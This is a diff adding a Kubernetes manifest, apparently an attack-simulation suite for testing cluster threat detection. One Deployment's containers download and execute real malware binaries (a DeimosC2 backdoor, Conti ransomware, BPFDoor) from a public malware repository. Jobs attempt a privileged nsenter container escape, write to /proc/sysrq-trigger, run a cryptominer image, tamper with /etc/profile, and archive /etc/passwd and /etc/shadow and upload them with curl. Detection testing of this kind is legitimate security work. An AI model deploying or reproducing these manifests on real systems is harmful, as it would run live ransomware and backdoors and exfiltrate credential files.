@@ -1,0 +1,205 @@
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: attk-k8-runner-deploy
+  labels:
+    app: busybox-script
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: busybox-script
+  template:
+    metadata:
+      labels:
+        app: busybox-script
+    spec:
+      securityContext:
+        runAsNonRoot: true
+        runAsUser: 1000
+        fsGroup: 2000
+      containers:
+      - name: c2-agent-container
+        image: busybox
+        command: ["sh", "-c", "wget https://raw.githubusercontent.com/timb-machine/linux-malware/main/malware/binaries/Unix.Backdoor.DeimosC2/05e9fe8e9e693cb073ba82096c291145c953ca3a3f8b3974f9c66d15c1a3a11d.elf.x86_64 -O /tmp/deimosC2.elf && chmod +x /tmp/deimosC2.elf && /tmp/deimosC2.elf"]
+        securityContext:
+          capabilities:
+            drop:
+              - ALL
+          readOnlyRootFilesystem: true
+          allowPrivilegeEscalation: false
+      - name: conti-ransomware-container
+        image: busybox
+        command: ["sh", "-c", "wget https://raw.githubusercontent.com/timb-machine/linux-malware/main/malware/binaries/Conti/bb64b27bff106d30a7b74b3589cc081c345a2b485a831d7e8c8837af3f238e1e.elf.x86_64 -O /tmp/conti.elf && chmod +x /tmp/conti.elf && /tmp/conti.elf"]
+        securityContext:
+          capabilities:
+            drop:
+              - ALL
+          readOnlyRootFilesystem: true
+          allowPrivilegeEscalation: false
+      - name: bpfdoor-container
+        image: busybox
+        command: ["sh", "-c", "wget https://raw.githubusercontent.com/timb-machine/linux-malware/main/malware/binaries/BPFDoor/07ecb1f2d9ffbd20a46cd36cd06b022db3cc8e45b1ecab62cd11f9ca7a26ab6d.elf.x86_64 -O /tmp/bpfdoor.elf && chmod +x /tmp/bpfdoor.elf && /tmp/bpfdoor.elf"]
+        securityContext:
+          capabilities:
+            drop:
+              - ALL
+          readOnlyRootFilesystem: true
+          allowPrivilegeEscalation: false
+      restartPolicy: Always
+      volumes:
+      - name: script-volume
+        emptyDir: {}
+      nodeSelector:
+        kubernetes.io/os: linux
+      tolerations:
+      - key: "node-role.kubernetes.io/master"
+        effect: "NoSchedule"
+      - key: "CriticalAddonsOnly"
+        operator: "Exists"
+      affinity:
+        podAntiAffinity:
+          preferredDuringSchedulingIgnoredDuringExecution:
+          - weight: 1
+            podAffinityTerm:
+              labelSelector:
+                matchExpressions:
+                - key: app
+                  operator: In
+                  values:
+                  - busybox-script
+              topologyKey: "kubernetes.io/hostname"
+---
+apiVersion: batch/v1
+kind: Job
+metadata:
+  name: system-info-discovery
+spec:
+  template:
+    spec:
+      containers:
+      - name: system-info
+        image: busybox
+        command: ["sh", "-c", "uname -a && lscpu && df -h && cat /etc/os-release && hostname"]
+      restartPolicy: Never
+---
+apiVersion: batch/v1
+kind: Job
+metadata:
+  name: network-connection-http
+spec:
+  template:
+    spec:
+      containers:
+      - name: network-connection
+        image: curlimages/curl
+        command: ["curl", "-I", "http://example.com"]
+      restartPolicy: Never
+---
+apiVersion: batch/v1
+kind: Job
+metadata:
+  name: privileged-container-escape
+spec:
+  template:
+    spec:
+      containers:
+      - name: privileged-container
+        image: busybox
+        command: ["sh", "-c", "nsenter --target 1 --mount && touch /tmp/escalation_success"]
+        securityContext:
+          privileged: true
+      restartPolicy: Never
+---
+apiVersion: batch/v1
+kind: Job
+metadata:
+  name: kernel-exploit-simulation
+spec:
+  template:
+    spec:
+      containers:
+      - name: kernel-exploit
+        image: alpine
+        command: ["sh", "-c", "echo 'Simulating kernel exploit by attempting to write to /proc/sysrq-trigger' && echo 1 > /proc/sysrq-trigger"]
+        securityContext:
+          capabilities:
+            add:
+              - SYS_ADMIN
+      restartPolicy: Never
+---
+apiVersion: batch/v1
+kind: Job
+metadata:
+  name: unauthorized-host-access
+spec:
+  template:
+    spec:
+      containers:
+      - name: unauthorized-host
+        image: busybox
+        command: ["sh", "-c", "echo 'Accessing host resources' && cat /proc/1/maps"]
+      restartPolicy: Never
+---
+apiVersion: batch/v1
+kind: Job
+metadata:
+  name: lateral-movement-simulation
+spec:
+  template:
+    spec:
+      containers:
+      - name: lateral-movement
+        image: busybox
+        command: ["sh", "-c", "echo 'Simulating lateral movement by accessing shared directory' && ls /mnt/shared"]
+        volumeMounts:
+        - name: shared-volume
+          mountPath: /mnt/shared
+      restartPolicy: Never
+      volumes:
+      - name: shared-volume
+        emptyDir: {}
+---
+apiVersion: batch/v1
+kind: Job
+metadata:
+  name: cryptominer-deployment
+spec:
+  template:
+    spec:
+      containers:
+      - name: cryptominer
+        image: rkjnsn/coinhive-miner:latest
+      restartPolicy: Never
+---
+apiVersion: batch/v1
+kind: Job
+metadata:
+  name: hijack-execution-flow
+spec:
+  template:
+    spec:
+      containers:
+      - name: hijack-script
+        image: busybox
+        command: ["sh", "-c", "echo 'echo Malicious activity detected' >> /etc/profile && source /etc/profile"]
+      restartPolicy: Never
+---
+apiVersion: batch/v1
+kind: Job
+metadata:
+  name: unauthorized-file-access
+spec:
+  template:
+    spec:
+      containers:
+      - name: unauthorized-access
+        image: busybox
+        command: ["sh", "-c", "tar -czvf /tmp/sensitive_data.tar.gz /etc/passwd /etc/shadow && curl -T /tmp/sensitive_data.tar.gz http://example.com/upload"]
+        volumeMounts:
+        - name: tmp-volume
+          mountPath: /tmp
+      restartPolicy: Never
+      volumes:
+      - name: tmp-volume
+        emptyDir: {}
